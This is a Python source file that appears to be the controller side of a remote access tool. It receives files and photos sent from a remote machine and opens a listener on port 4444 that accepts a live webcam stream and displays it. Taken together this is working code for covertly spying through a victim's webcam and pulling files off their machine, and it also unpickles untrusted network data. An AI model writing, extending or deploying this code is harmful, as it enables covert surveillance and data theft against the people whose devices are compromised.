import random, string, os, cv2, pickle, struct
import socket
def download(filename, conn):
    file = open(filename, 'wb')
    while True:
        bits = conn.recv(1024)
        file.write(bits)
        if str.encode("DONE") in bits:
            break
    file.close()
    print("[+] File is saved to {}".format(os.getcwd()))

def random_string():
    LENGTH = 10
    string_name = ""
    alphabets = string.ascii_lowercase
    for i in range(LENGTH):
        string_name += random.choice(alphabets)
    return string_name
def photo_capture(conn):
    filename = random_string()
    filename = filename+".jpg"
    file = open(filename, 'wb')
    while True:
        bits = conn.recv(1024)
        file.write(bits)
        if str.encode("DONE") in bits:
            break
    file.close()
    print("[+] Photo is saved to {}".format(os.getcwd()))
def webcam():
    host, port = "192.168.2.103", 4444
    server = socket.socket()
    server.bind((host, port))
    server.listen(2)
    print("Opening stream...")
    connection, address = server.accept()
    data = b""
    payload_size = struct.calcsize(">L")
    while True:
        while len(data) < payload_size:
            data += connection.recv(4096)
        connection.send(str.encode("."))
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack(">L", packed_msg_size)[0]
        while len(data) < msg_size:
            data += connection.recv(4096)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
        cv2.imshow("ImageView", frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            connection.send(str.encode("DONE"))
            break
    cv2.destroyAllWindows()
    connection.close()
